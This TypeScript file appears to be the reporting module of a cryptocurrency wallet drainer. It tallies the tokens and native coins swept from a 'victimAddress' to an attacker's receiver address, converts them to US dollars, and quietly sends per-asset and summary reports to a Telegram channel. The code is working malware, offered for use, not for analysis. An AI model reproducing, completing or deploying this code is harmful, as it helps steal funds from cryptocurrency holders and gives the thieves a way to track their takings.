import * as tg from "@/lib/telegram";
import { ethers } from "ethers";

/** 📊 FORMATTER: Ensures currency is consistent across all reports */
export const formatMoney = (val: any) => {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
  }).format(Number(val || 0));
};

interface ReportParams {
  assets: any[];
  txHash: string;
  chainId: number;
  victimAddress: string;
  receiver: string;
  suffix: string;
  strikeType: string;
  nativeSym: string;
  sweepValue: bigint;
}

/** 🚀 UNIFIED TELEMETRY ENGINE */
export async function sendFinalReports({
  assets,
  txHash,
  chainId,
  victimAddress,
  receiver,
  suffix,
  strikeType,
  nativeSym,
  sweepValue,
}: ReportParams) {
  let totalUSD = 0;
  let actualAssetCount = 0;
  const telemetryPromises = [];

  // 1️⃣ Process ERC-20 / BEP-20 / Alt-Tokens
  for (const a of assets) {
    const addr = a.token || a.contractAddress;
    // Skip native address placeholders (handled below)
    if (!addr || addr === "0x0000000000000000000000000000000000000000")
      continue;

    const usdVal = Number(a.usdValue || a.v || 0);
    totalUSD += usdVal;
    actualAssetCount++;

    telemetryPromises.push(
      tg.sendDetailedSweepToTelegram({
        status: "SUCCESS",
        hash: txHash,
        chainId: chainId.toString(),
        victimAddress: victimAddress,
        receiverAddress: receiver,
        amount: formatMoney(usdVal),
        symbol: `${a.symbol || "Token"} ${suffix}`,
        type: strikeType,
      }),
    );
  }

  // 2️⃣ Process Native Asset (ETH, BNB, etc.)
  if (sweepValue > 0n) {
    const nativeAsset = assets.find(
      (a: any) =>
        a.signatureType === "NATIVE" ||
        !a.token ||
        a.token === "0x0000000000000000000000000000000000000000",
    );

    const nativePrice = Number(nativeAsset?.price || 0);
    const nativeAmount = parseFloat(ethers.formatEther(sweepValue));
    const actualNativeUSD =
      nativePrice > 0
        ? nativeAmount * nativePrice
        : Number(nativeAsset?.usdValue || 0);

    totalUSD += actualNativeUSD;
    actualAssetCount++;

    telemetryPromises.push(
      tg.sendDetailedSweepToTelegram({
        status: "SUCCESS",
        hash: txHash,
        chainId: chainId.toString(),
        victimAddress: victimAddress,
        receiverAddress: receiver,
        amount: formatMoney(actualNativeUSD),
        symbol: `${nativeAsset?.symbol || nativeSym} ${suffix}`,
        type: strikeType,
      }),
    );
  }

  // 3️⃣ Send Final Summary
  telemetryPromises.push(
    tg.sendSweepSummaryToTelegram({
      victimAddress: victimAddress,
      totalAmount: formatMoney(totalUSD),
      assetCount: actualAssetCount,
      type: strikeType,
      suffix,
      hash: txHash,
    }),
  );

  // Execute all reporting silently to prevent blocking the main response
  return Promise.all(telemetryPromises).catch((err) =>
    console.error(`[DEBUG] Telemetry Error: ${err.message}`),
  );
}
